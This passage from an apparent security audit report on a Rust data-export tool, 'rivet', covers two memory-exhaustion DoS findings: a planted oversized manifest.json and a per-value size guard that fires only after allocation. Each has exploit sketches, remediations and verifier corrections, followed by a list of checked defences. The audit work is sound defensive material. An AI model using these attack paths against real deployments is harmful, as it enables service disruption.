**Эксплойт.** Threat model's "attacker who can write the destination prefix" (a compromised CI step, a misconfigured shared bucket prefix, or anyone with PUT on the export prefix). Attacker overwrites `<prefix>/manifest.json` with a multi-gigabyte body — either raw bytes or, for far worse amplification, a deeply-nested/huge JSON array like `{"manifest_version":1,...,"parts":[<10 million tiny {"part_id":0,"path":"x","rows":0,"size_bytes":0,"content_fingerprint":"x","status":"committed"} objects>]}`. The next time any operator runs `rivet run --resume` (resume_m8.rs:137), `rivet validate` (validate_manifest.rs:357), `rivet reconcile`, or `rivet repair` (repair_cmd.rs:324) against that prefix, `dest.head()` confirms presence but its `ObjectMeta.size_bytes` is dropped via the `Ok(Some(_))` wildcard; `dest.read()` then loads the entire object (local `std::fs::read`, cloud `self.op.read(&full)` — both uncapped) and `serde_json::from_slice` materializes ~10-20x that as parsed `Vec<ManifestPart>` structs. Process OOMs / is killed; on a host running multiple exports the OOM-killer can take out unrelated work.

**Воздействие.** DoS: the export/validate/resume/repair process is OOM-killed by a single attacker-planted object the operator never inspects; serde_json struct amplification multiplies a ~hundreds-of-MB file into multi-GB RSS. A resume that should recover a run instead crashes the run.

**Ремедиация.** Gate the read on the size already returned by head(): in each of the three readers, capture `ObjectMeta { size_bytes, .. }` from `head()` and bail (or treat as legacy/unverifiable) when `size_bytes` exceeds a sane manifest ceiling (e.g. 64 MB). Add a `read_capped(key, max_bytes)` to the `Destination` trait (local: stream + early-abort past the cap; cloud: `op.reader(...).read(0..max)` or check `stat().content_length()` first) and route manifest/_SUCCESS reads through it. The trait doc already says read() is "for small artifacts only" — enforce that contract instead of trusting it.

**Поправка верификатора.** The code mechanism is exactly as described (size_bytes from head() is discarded, read() is uncapped, no deny_unknown_fields, struct amplification into Vec<ManifestPart> is real, and the pattern repeats in validate/repair/reconcile). What the finding gets wrong is the attacker. It is labeled `malicious-source-db-data`, but manifest.json is written BY rivet to the destination object store (manifest_writer.rs:289) from rivet's own bookkeeping — source-DB cell values never flow into the manifest body. A compromised source DB cannot write the destination prefix, so against the stated attacker there is no path at all. The exploit text then silently substitutes a different, stronger attacker — 'anyone with PUT on the export prefix' — which is not one of the six threat models. An adversary who can overwrite <prefix>/manifest.json already controls rivet's entire output corpus and resume state (can plant arbitrary part paths, flip statuses, redirect quarantine moves, or wipe all output); a recoverable OOM of an operator-initiated resume is strictly weaker than what they already have. This is a co-located-trust hardening item, not an exploitable vuln in-model.

#### 23. Per-value ceiling guard (check_value_ceiling) runs only after the giant cell is fully materialized in Arrow
`src/pipeline/sink/mod.rs:264` · CWE-770 Allocation of Resources Without Limits or Throttling · attacker: **malicious-source-db-data** · **EXPLOITABLE** · ревьюер: dos-resource

```rust
fn check_value_ceiling(&self, batch: &RecordBatch) -> Result<()> {
        ...
        let Some(limit) = self.max_value_bytes else {
            return Ok(());
        };
```

**Эксплойт.** A malicious source returns a single row whose TEXT/BLOB cell is, say, 4 GB (MySQL `longblob`/`longtext`, PG `text`). The mysql/postgres driver decodes that cell into a `Value::Bytes`/string (one full copy), then `rows_to_record_batch_typed` copies it again into an Arrow `StringArray`/`BinaryArray` (a second full copy) — both happen in the source fetch loop BEFORE `sink.on_batch` -> `check_value_ceiling` ever runs (mod.rs:589). The guard then correctly bails with RIVET_VALUE_TOO_LARGE, but the ~8 GB of transient allocation has already occurred, so on a memory-constrained host the process OOMs before the guard fires. The guard also defaults to off when `max_value_mb` is unset/0.

**Воздействие.** DoS: a single adversarial oversized cell can OOM the process despite the guard, because the guard is downstream of two full materializations. Mostly mitigated for multi-row batches by the upstream byte-per-row probe, but a single huge row in the first (probe) batch bypasses that mitigation too.

**Ремедиация.** This is a known structural limitation (the code comment acknowledges the guard's placement). The only true fix is a source-side cap before materialization (e.g. `SUBSTRING(col, 1, max+1)` length probe or driver-level max-allowed-packet/field-size limit) so the giant cell is never decoded whole. At minimum, document that `max_value_mb` does not prevent the transient decode allocation, and consider a default non-zero ceiling so the guard is not opt-in.

**Поправка верификатора.** Two errors in the finding. (1) The claim "the guard also defaults to off when max_value_mb is unset/0" is FALSE: all three tuning profiles (Fast/Balanced/Safe) initialise max_value_mb = Some(256) in src/tuning/profile.rs:206/222/238, and sink/mod.rs:131-135 only disables it when the operator explicitly sets 0. So the guard is ON by default at 256 MB. (2) The ~8 GB transient is optimistic for the attacker: a single value is bounded by the negotiated max_allowed_packet (MySQL) / ~1 GB field limit (Postgres text), and — crucially — with the default 256 MB guard the worst per-value transient is ~2×256 MB ≈ 512 MB before the clean RIVET_VALUE_TOO_LARGE abort, not an unbounded OOM. The reporter is right that the per-row PROBE_BATCH_SIZE=500 tuner (batch_controller.rs:26) is a batch-sizing measurement on an ALREADY-materialized batch and gives no pre-materialization per-value protection.


---

## Info / проверенные защиты (не уязвимости)

- ℹ️ **Config-supplied identifiers (chunk_column, cursor_column, cursor_fallback_column, time_column) have no validation at config-load time** (`src/config/mod.rs:556`, CWE-20 Improper Input Validation)
- ℹ️ **Type-probe wrappers SELECT * FROM ({query}) embed the operator's own query text verbatim (stacked/comment risk on operator query)** (`src/source/postgres/mod.rs:612`, CWE-89 SQL Injection)
- ✅ **GCS data-plane endpoint is config-controlled but token MINT endpoint is hardcoded — verify the asymmetry holds (token mint not SSRF-able); data-plane bearer token still leaks via custom endpoint** (`src/destination/gcs_auth.rs:13`, CWE-918 Server-Side Request Forgery)
- ✅ **opendal's default HTTP client follows 3xx redirects — a 302 from the configured endpoint could chase a token to an attacker host (mitigated by reqwest cross-host header stripping)** (`src/destination/cloud.rs:158`, CWE-601 URL Redirection to Untrusted Site)
- ✅ **Credentials are correctly NOT passed on child argv — re-exec design is sound (no CWE-214)** (`src/pipeline/parallel_children.rs:103`, CWE-214 Invocation of Process Using Visible Sensitive Information)
- ✅ **Parent does not trust child stdout JSON for state/exit decisions (IPC trust boundary is sound)** (`src/pipeline/parallel_children.rs:252`, n/a)
- ✅ **YAML billion-laughs / alias-expansion DoS is already mitigated by the parser (verification, info)** (`src/config/mod.rs:85`, n/a)
- ℹ️ **Raw driver/connection errors streamed to MCP client without passing through redact_error** (`src/mcp.rs:213`, CWE-209 Information Exposure Through an Error Message)
- ℹ️ **Vendored static OpenSSL 3.6.2 statically linked into the Linux binary — OS security updates never apply (CWE-1104)** (`Cargo.toml:76`, CWE-1104 Use of Unmaintained/Unpatched Third-Party Components)
- ℹ️ **rsa Marvin timing side-channel (RUSTSEC-2023-0071) reachable via GCS service-account JWT signing, no upstream fix** (`.cargo/audit.toml:26`, CWE-208 Observable Timing Discrepancy)

---

## Опровергнуто верификацией
- **Re-exec uses trusted current_exe(), not a PATH/config-derived name (no CWE-426)** (`src/pipeline/parallel_children.rs:42`) — I read parallel_children.rs in full and confirmed line 42 (`std::env::current_exe()`) and line 103 (`Command::new(&exe)`) match the evidence exactly. I grepped the whole tree for `Command::new`, `proc

---

*Сгенерировано мульти-агентным секьюрити-workflow (44 агента): 10 ред-тим ревьюеров → дедуп → адверсариальная exploit-верификация. Каждое подтверждение прошло попытку реального эксплойта в модели угроз.*